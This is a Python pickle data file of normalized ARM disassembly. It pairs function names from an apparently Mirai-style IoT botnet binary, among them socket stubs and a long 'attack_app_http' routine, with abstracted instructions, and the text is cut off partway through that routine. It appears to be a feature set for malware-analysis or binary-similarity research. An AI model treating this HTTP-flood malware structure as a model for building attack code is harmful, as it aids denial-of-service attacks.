(lp0
(S'.init_proc'
p1
S'"MOV~R12,SP\nSTMFD~SP!,{R4-R12,LR,PC}\nSUB~R11,R12,0\nBL~FOO\nBL~FOO\nLDMDB~R11,{R4-R11,SP,PC}"'
p2
L24L
tp3
a(S'strcpy'
p4
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p5
L12L
tp6
a(S'ioctl'
p7
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p8
L12L
tp9
a(S'recv'
p10
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p11
L12L
tp12
a(S'connect'
p13
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p14
L12L
tp15
a(S'sigemptyset'
p16
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p17
L12L
tp18
a(S'memmove'
p19
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p20
L12L
tp21
a(S'getpid'
p22
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p23
L12L
tp24
a(S'prctl'
p25
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p26
L12L
tp27
a(S'memcpy'
p28
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p29
L12L
tp30
a(S'readlink'
p31
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p32
L12L
tp33
a(S'malloc'
p34
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p35
L12L
tp36
a(S'sleep'
p37
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p38
L12L
tp39
a(S'recvfrom'
p40
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p41
L12L
tp42
a(S'socket'
p43
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p44
L12L
tp45
a(S'select'
p46
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p47
L12L
tp48
a(S'readdir'
p49
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p50
L12L
tp51
a(S'sigaddset'
p52
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p53
L12L
tp54
a(S'send'
p55
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p56
L12L
tp57
a(S'abort'
p58
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p59
L12L
tp60
a(S'accept'
p61
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p62
L12L
tp63
a(S'calloc'
p64
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p65
L12L
tp66
a(S'write'
p67
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p68
L12L
tp69
a(S'kill'
p70
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p71
L12L
tp72
a(S'bind'
p73
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p74
L12L
tp75
a(S'inet_addr'
p76
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p77
L12L
tp78
a(S'chdir'
p79
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p80
L12L
tp81
a(S'setsockopt'
p82
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p83
L12L
tp84
a(S'signal'
p85
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p86
L12L
tp87
a(S'read'
p88
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p89
L12L
tp90
a(S'unlink'
p91
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p92
L12L
tp93
a(S'sendto'
p94
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p95
L12L
tp96
a(S'realloc'
p97
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p98
L12L
tp99
a(S'listen'
p100
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p101
L12L
tp102
a(S'fork'
p103
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p104
L12L
tp105
a(S'__uClibc_main'
p106
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p107
L12L
tp108
a(S'memset'
p109
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p110
L12L
tp111
a(S'getppid'
p112
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p113
L12L
tp114
a(S'time'
p115
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p116
L12L
tp117
a(S'opendir'
p118
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p119
L12L
tp120
a(S'getsockopt'
p121
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p122
L12L
tp123
a(S'__errno_location'
p124
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p125
L12L
tp126
a(S'exit'
p127
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p128
L12L
tp129
a(S'atoi'
p130
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p131
L12L
tp132
a(S'open'
p133
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p134
L12L
tp135
a(S'clock'
p136
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p137
L12L
tp138
a(S'setsid'
p139
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p140
L12L
tp141
a(S'closedir'
p142
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p143
L12L
tp144
a(S'fcntl'
p145
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p146
L12L
tp147
a(S'close'
p148
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p149
L12L
tp150
a(S'raise'
p151
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p152
L12L
tp153
a(S'free'
p154
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p155
L12L
tp156
a(S'sigprocmask'
p157
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p158
L12L
tp159
a(S'getsockname'
p160
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p161
L12L
tp162
a(S'__do_global_dtors_aux'
p163
S'"STMFD~SP!,{R4,R5,LR}\nLDR~R5,<STR>\nLDRB~R3,[R5]\nCMP~R3,0\nLDMNEFD~SP!,{R4,R5,PC}\nLDR~R4,<STR>\nLDR~R3,[R4]\nLDR~R2,[R3]\nCMP~R2,0\nBEQ~FOO\nADD~R3,R3,0\nSTR~R3,[R4]\nMOV~LR,PC\nMOV~PC,R2\nLDR~R3,[R4]\nLDR~R2,[R3]\nCMP~R2,0\nBNE~FOO\nLDR~R3,<STR>\nCMP~R3,0\nLDRNE~R0,<STR>\nMOVNE~LR,PC\nMOVNE~PC,R3\nMOV~R3,0\nSTRB~R3,[R5]\nLDMFD~SP!,{R4,R5,PC}"'
p164
L104L
tp165
a(S'call___do_global_dtors_aux'
p166
S'"STR~LR,[SP,-0]\nLDR~PC,[SP]"'
p167
L8L
tp168
a(S'frame_dummy'
p169
S'"LDR~R3,<STR>\nCMP~R3,0\nSTR~LR,[SP,-0]\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOVNE~LR,PC\nMOVNE~PC,R3\nLDR~R0,<STR>\nLDR~R3,[R0]\nCMP~R3,0\nLDR~R3,<STR>\nLDREQ~PC,[SP]\nCMP~R3,0\nLDREQ~PC,[SP]\nMOV~LR,PC\nMOV~PC,R3\nLDR~PC,[SP]"'
p170
L68L
tp171
a(S'call_frame_dummy'
p172
S'"STR~LR,[SP,-0]\nLDR~PC,[SP]"'
p173
L8L
tp174
a(S'_start'
p175
S'"MOV~R11,0\nMOV~LR,0\nLDR~R1,[SP]\nMOV~R2,SP\nSTR~R2,[SP,-0]\nSTR~R0,[SP,-0]\nLDR~R12,<STR>\nSTR~R12,[SP,-0]\nLDR~R0,<STR>\nLDR~R3,<STR>\nB~FOO"'
p176
L44L
tp177
a(S'attack_app_http'
p178
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nAND~R4,R2,0\nMOV~R5,R3\nMOV~R12,R0\nAND~R12,R12,0\nSTR~R1,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nMOV~R1,R5\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R0,R4\nLDR~R3,<STR>\nBL~FOO\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R8,R0\nMOV~R0,R4\nBL~FOO\nMOV~R1,R5\nMOV~R9,R0\nMOV~R2,0\nMOV~R0,R4\nLDR~R3,<STR>\nBL~FOO\nMOV~R1,R5\nMOV~R10,R0\nMOV~R2,0\nMOV~R0,R4\nMOV~R3,0\nBL~FOO\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R6,R0\nMOV~R0,R4\nBL~FOO\nMOV~R3,R0,LSL0\nADD~R0,SP,0\nMOV~R3,R3,LSR0\nSUB~R0,R0,0\nMOV~R1,0\nLDR~R2,<STR>\nSTR~R3,[SP,0]\nBL~FOO\nCMP~R10,0\nCMPNE~R9,0\nMOVNE~R4,0\nMOVEQ~R4,0\nBEQ~FOO\nMOV~R0,R10\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,R9\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,R8\nBL~FOO\nCMP~R0,0\nADDLE~R1,SP,0\nSTRLE~R4,[R1,0]\nBLE~FOO\nB~FOO\nADD~R2,SP,0\nLDR~R1,[R2,0]\nLDRB~R2,[R8,R1]\nSUB~R3,R2,0\nCMP~R3,0\nSUB~R2,R2,0\nSTRLSB~R2,[R8,R1]\nADD~R7,SP,0\nLDR~R3,[R7,0]\nADD~R3,R3,0\nSTR~R3,[R7,0]\nADD~R12,SP,0\nMOV~R0,R8\nLDR~R4,[R12,0]\nBL~FOO\nCMP~R4,R0\nBLT~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nCMP~R6,0\nMOVGE~R6,0\nMOV~R0,0\nSTR~R6,[SP,0]\nBL~FOO\nLDR~R0,[SP,0]\nLDR~R1,<STR>\nBL~FOO\nMOV~R11,0\nMOV~R5,R0\nSTR~R0,[SP,0]\nB~FOO\nMOV~R3,0\nLDR~R1,[SP,0]\nSTRB~R3,[R5,0]\nMOV~R3,0\nSTR~R3,[R5]\nMOV~R0,R11\nBL~FOO\nLDR~R6,[SP,0]\nMOV~R3,0\nMLA~R6,R0,R3,R6\nLDR~R3,[R6,0]\nADD~R7,R5,0\nSTR~R3,[R5,0]\nMOV~R0,R7\nMOV~R1,R10\nBL~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nBEQ~FOO\nMOV~R0,R7\nBL~FOO\nMOV~R1,R7\nMOV~R2,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R3,0\nSTRB~R3,[R5,0]\nMOV~R1,R8\nADD~R0,R5,0\nBL~FOO\nADD~R0,R5,0\nMOV~R1,R8\nADD~R0,R0,0\nBL~FOO\nADD~R0,R5,0\nADD~R0,R0,0\nMOV~R1,R9\nBL~FOO\nLDRB~R3,[R6,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R6,0]\nBL~FOO\nAND~R2,R4,0\nAND~R3,R4,0\nMOV~R2,R2,LSR0\nMOV~R3,R3,LSL0\nLDRB~R1,[R6,0]\nORR~R3,R3,R4,LSL0\nORR~R2,R2,R4,LSR0\nORR~R2,R2,R3\nADD~R2,R2,R0,LSRR1\nAND~R3,R2,0\nAND~R1,R2,0\nMOV~R3,R3,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R2,LSL0\nORR~R3,R3,R2,LSR0\nORR~R3,R3,R1\nSTR~R3,[R5,0]\nBL~FOO\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nLDRLS~PC,[PC,R0,LSL0]\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,0\nBL~FOO\nMOV~R0,0\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,0\nBL~FOO\nMOV~R0,0\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,0\nBL~FOO\nMOV~R0,0\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,0\nBL~FOO\nMOV~R0,0\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R7\nMOV~R1,R10\nBL~FOO\nADD~R5,R5,0\nADD~R11,R11,0\nADD~R5,R5,0\nLDR~LR,[SP,0]\nCMP~R11,LR\nBLT~FOO\nMOV~R0,0\nBL~FOO\nMOV~R2,0\nMOV~R11,R0\nADD~R3,SP,0\nMOV~R1,0\nADD~R3,R3,0\nSTR~R1,[R2,R3]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nMOV~R2,R1\nADD~R3,SP,0\nMOV~R0,0\nADD~R3,R3,0\nSTR~R0,[R2,R3]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nLDR~R1,[SP,0]\nADD~R6,R1,0\nMOV~R10,R0\nADD~R6,R6,0\nSTR~R0,[SP,0]\nB~FOO\nLDRB~R3,[R6,-0]\nSUB~R7,R6,0\nCMP~R3,0\nSUB~R7,R7,0\nBNE~FOO\nLDR~R3,[R6,-0]\nCMP~R3,0\nMOVNE~R3,0\nSTRNEB~R3,[R6,-0]\nSTREQB~R3,[R6,-0]\nBEQ~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nADD~R7,SP,0\nADD~R7,R7,0\nMOV~R0,R7\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nLDR~R0,[R6,-0]\nCMN~R0,0\nBLNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nMOV~R4,R0\nSTR~R0,[R6,-0]\nBEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R1,0\nORR~R2,R0,0\nMOV~R0,R4\nBL~FOO\nLDR~R2,<STR>\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R2,[R3,-0]\nMOV~R12,0\nMOV~R1,0\nMOV~R2,0\nLDR~R0,[R6,-0]\nSTR~R12,[SP]\nBL~FOO\nLDR~R2,[SP,0]\nAND~R3,R2,0\nMOV~R12,R2,LSR0\nORR~R12,R12,R3,LSL0\nLDR~R4,[R6,-0]\nMOV~LR,0\nMOV~R5,R12,ASR0\nMOV~R3,0\nMOV~R1,R7\nADD~R7,SP,0\nSTRB~R3,[R7,0]\nLDR~R0,[R6,-0]\nSTRB~R5,[R7,0]\nSTR~R4,[R7,0]\nMOV~R2,0\nSTRB~LR,[R6,-0]\nSTR~R11,[R6,-0]\nSTRB~LR,[R7,0]\nSTRB~R12,[R7,0]\nBL~FOO\nLDR~R12,[R6,-0]\nADD~LR,SP,0\nMOV~R3,R12,LSR0\nADD~LR,LR,0\nADD~R0,LR,R3,LSL0\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~R3,[R6,-0]\nRSB~R3,R3,R11\nCMP~R3,0\nBHI~FOO\nLDR~R12,[R6,-0]\nADD~R1,SP,0\nMOV~R3,R12,LSR0\nADD~R1,R1,0\nADD~R0,R1,R3,LSL0\nLDR~R2,[R0,-0]\nAND~R1,R12,0\nMOV~R3,0\nORR~R2,R2,R3,LSLR1\nCMP~R12,R10\nSTR~R2,[R0,-0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nADD~R5,SP,0\nMOV~R3,0\nMOV~R8,0\nADD~R0,R7,0\nADD~R5,R5,0\nSTR~R3,[R6]\nSUB~R5,R5,0\nADD~R0,R0,0\nMOV~R1,0\nSTR~R8,[R6,-0]\nBL~FOO\nMOV~R1,0\nMOV~R0,R5\nSTR~R8,[R6,0]\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R9,R7,0\nADD~R9,R9,0\nMOV~R1,R9\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R1,R7,0\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R1,R7,0\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R1,R7,0\nADD~R1,R1,0\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R8\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R8\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R8\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nLDR~R2,[SP,0]\nCMP~R2,R8\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R8\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R8\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nLDR~R0,[SP,0]\nBL~FOO\nMOV~R4,R0\nMOV~R0,R5\nBL~FOO\nMOV~R1,0\nADD~R2,R5,R0\nMOV~R0,R4\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nLDR~R3,[R6,0]\nCMP~R3,0\nBLE~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nADD~R3,SP,0\nSTR~R8,[R3,0]\nB~FOO\nBL~FOO\nADD~R12,SP,0\nLDR~R1,[R12,0]\nMOV~R1,R1,LSL0\nADD~R1,R1,0\nADD~R1,R7,R1\nADD~R0,R4,R0\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R4,R0\nBL~FOO\nADD~LR,SP,0\nLDR~R3,[LR,0]\nADD~R3,R3,0\nSTR~R3,[LR,0]\nADD~R1,SP,0\nLDR~R2,[R6,0]\nLDR~R3,[R1,0]\nADD~R4,SP,0\nADD~R4,R4,0\nSUB~R4,R4,0\nCMP~R3,R2\nMOV~R0,R4\nBLT~FOO\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R4,R0\nBL~FOO\nADD~R5,SP,0\nADD~R5,R5,0\nSUB~R5,R5,0\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nLDR~R2,[SP,0]\nCMP~R2,0\nBEQ~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,[SP,0]\nADD~R0,R5,R0\nBL~FOO\nADD~R4,R7,0\nMOV~R0,R9\nMOV~R1,R4\nBL~FOO\nCMP~R0,0\nMOVEQ~R0,R9\nMOVEQ~R1,R4\nBLEQ~FOO\nMOV~R0,R5\nLDR~R4,[R6,-0]\nBL~FOO\nMOV~R1,R5\nMOV~R2,R0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nLDR~R12,[R6,-0]\nADD~R7,SP,0\nMOV~R3,R12,LSR0\nADD~R7,R7,0\nADD~R0,R7,R3,LSL0\nLDR~R2,[R0,-0]\nMOV~R3,0\nAND~R1,R12,0\nORR~R2,R2,R3,LSLR1\nCMP~R12,R10\nADD~R3,R3,0\nADDGT~R10,R12,0\nSTR~R2,[R0,-0]\nSTR~R11,[R6,-0]\nSTRB~R3,[R6,-0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~R12,[R6,-0]\nADD~LR,SP,0\nMOV~R3,R12,LSR0\nADD~LR,LR,0\nADD~R0,LR,R3,LSL0\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~R12,[R6,-0]\nADD~R1,SP,0\nMOV~R3,R12,LSR0\nADD~R1,R1,0\nADD~R0,R1,R3,LSL0\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~R12,[R6,-0]\nADD~R2,SP,0\nMOV~R3,R12,LSR0\nADD~R2,R2,0\nADD~R0,R2,R3,LSL0\nLDR~R2,[R0,-0]\nAND~R1,R12,0\nMOV~R3,0\nORR~R2,R2,R3,LSLR1\nSTR~R2,[R0,-0]\nCMP~R12,R10\nADDGT~R10,R12,R3\nB~FOO\nMOV~R3,0\nSTRB~R3,[R6,-0]\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nLDR~R3,[SP,0]\nADD~R3,R3,0\nADD~R6,R6,0\nSTR~R3,[SP,0]\nADD~R6,R6,0\nLDR~R7,[SP,0]\nLDR~R12,[SP,0]\nCMP~R7,R12\nBLT~FOO\nCMP~R10,0\nBEQ~FOO\nADD~LR,SP,0\nMOV~R12,0\nSTR~R12,[LR,0]\nADD~R12,SP,0\nMOV~R5,0\nADD~R12,R12,0\nADD~R1,SP,0\nADD~R2,SP,0\nADD~R1,R1,0\nSTR~R12,[SP]\nADD~R2,R2,0\nMOV~R3,R5\nSTR~R5,[LR,0]\nMOV~R0,R10\nBL~FOO\nMOV~R4,R0\nMOV~R0,R5\nBL~FOO\nCMP~R4,R5\nLDRGT~R1,[SP,0]\nSTR~R0,[SP,0]\nSTRGT~R5,[SP,0]\nADDGT~R7,R1,0\nBGT~FOO\nB~FOO\nLDR~R0,[R7,-0]\nSUB~R2,R7,0\nCMN~R0,0\nSTR~R2,[SP,0]\nBEQ~FOO\nADD~R12,SP,0\nMOV~R3,R0,LSR0\nADD~R12,R12,0\nADD~R3,R12,R3,LSL0\nLDR~R3,[R3,-0]\nAND~R2,R0,0\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nADD~R12,SP,0\nMOV~R4,0\nADD~LR,SP,0\nADD~R12,R12,0\nMOV~R5,0\nADD~R3,SP,0\nSTR~R12,[SP]\nMOV~R1,0\nADD~R3,R3,0\nMOV~R2,R4\nSTR~R5,[LR,0]\nSTR~R4,[LR,0]\nBL~FOO\nADD~R1,SP,0\nLDR~R3,[R1,0]\nORRS~R0,R0,R3\nSTREQB~R4,[R7,-0]\nBEQ~FOO\nLDR~R0,[R7,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R7,-0]\nB~FOO\nLDR~R2,[R7,-0]\nADD~R12,SP,0\nMOV~R3,R2,LSR0\nADD~R12,R12,0\nADD~R3,R12,R3,LSL0\nLDR~R3,[R3,-0]\nAND~R2,R2,0\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nLDRB~R3,[R7,-0]\nCMP~R3,0\nBNE~FOO\nADD~R5,SP,0\nSUB~R5,R5,0\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nLDR~R0,[R7,-0]\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nBL~FOO\nSUBS~R10,R0,0\nLDR~R8,<STR>\nBLE~FOO\nMOV~R0,R5\nMOV~R1,R10\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nCMP~R10,0\nBLT~FOO\nLDR~R2,<STR>\nMOV~R3,0\nMOV~R1,R10\nMOV~R0,R5\nBL~FOO\nADD~LR,SP,0\nADD~LR,LR,0\nADD~R3,LR,R0\nMOV~R6,0\nSTRB~R6,[R3,R8]\nMOV~R1,R6\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R5\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R7,-0]\nMOV~R1,R6\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R5\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R7,-0]\nMOV~R1,R6\nMOV~R0,0\nSTR~R6,[R7]\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R5\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R1,R6\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R5\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R0\nLDRB~R3,[R3,R8]\nCMP~R3,0\nMOV~R4,R0\nADDEQ~R4,R0,0\nADD~R5,R5,R4\nLDR~R2,<STR>\nMOV~R0,R5\nRSB~R1,R4,R10\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nMOV~R2,R0\nBEQ~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nCMP~R0,0\nSUB~R3,R3,0\nSUBGT~R2,R0,0\nSUB~R3,R3,0\nSTRB~R6,[R3,R2]\nMOV~R0,R5\nBL~FOO\nMOV~R1,R6\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R4\nMOV~R2,R0\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R7]\nMOV~R6,0\nMOV~R1,R6\nMOV~R0,0\nSTR~R6,[R7,0]\nBL~FOO\nADD~R5,SP,0\nSUB~R5,R5,0\nMOV~R2,R0\nMOV~R1,R10\nMOV~R0,R5\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R1,R6\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R5\nBL~FOO\nADD~LR,SP,0\nADD~LR,LR,0\nLDR~R3,<STR>\nADD~R2,LR,R0\nLDRB~R3,[R2,R3]\nCMP~R3,0\nMOV~R4,R0\nADDEQ~R4,R0,0\nADD~R5,R5,R4\nLDR~R2,<STR>\nMOV~R0,R5\nRSB~R1,R4,R10\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nMOV~R2,R0\nBEQ~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R4\nCMP~R0,0\nSUB~R3,R3,0\nSUBGT~R2,R0,0\nSUB~R3,R3,0\nSTRB~R6,[R3,R2]\nMOV~R0,R5\nBL~FOO\nMOV~R1,R6\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R4\nMOV~R2,R0\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R7,0]\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nADD~R5,SP,0\nSUB~R5,R5,0\nMOV~R2,R0\nMOV~R1,R10\nMOV~R0,R5\nBL~FOO\nCMN~R0,0\nMOVEQ~R3,0\nSTREQ~R3,[R7,0]\nBEQ~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R5\nBL~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R3,R0\nLDR~R3,<STR>\nLDRB~R3,